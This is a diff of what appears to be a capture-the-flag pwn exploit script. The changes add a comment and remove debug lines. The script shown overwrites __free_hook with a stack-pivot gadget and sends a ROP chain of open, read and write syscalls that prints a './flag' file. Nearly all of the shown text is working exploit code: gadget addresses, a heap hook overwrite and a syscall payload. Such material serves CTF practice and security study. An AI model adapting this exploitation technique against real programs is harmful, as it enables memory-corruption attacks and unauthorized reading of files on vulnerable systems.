@@ -55,7 +55,7 @@ magic=0x4b8fb8
 # edit(2, p64(free_hook))
 edit(2,p64(0x6CCD68)+p64(0x6CCD70)+p64(0)*4)
 edit(0,p64(free_hook)+p64(0x6CCE40)+b"./flag\x00\x00")
-edit(1,p64(magic))
+edit(1,p64(magic)) # 交换esp
 
 flag=0x6ccd78
 rdi=0x401a16
@@ -63,18 +63,12 @@ rsi=0x401b37
 rdx=0x443136
 rax=0x41fc84
 syscall=0x4678e5
+
 payload =p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)
 payload+=p64(rdi)+p64(3)+p64(rsi)+p64(0x6CBBA0)+p64(rdx)+p64(0x60)+p64(rax)+p64(0)+p64(syscall)
 payload+=p64(rdi)+p64(1)+p64(rax)+p64(1)+p64(syscall)
 edit(2,payload)
 delete(2)
-#ddebug("b *0x41e985 \nset glibc 2.23\n continue")
-
-"""
-0x000000000041fc84 : pop rax ; ret
-"""
-
-
 
 io.interactive()
 
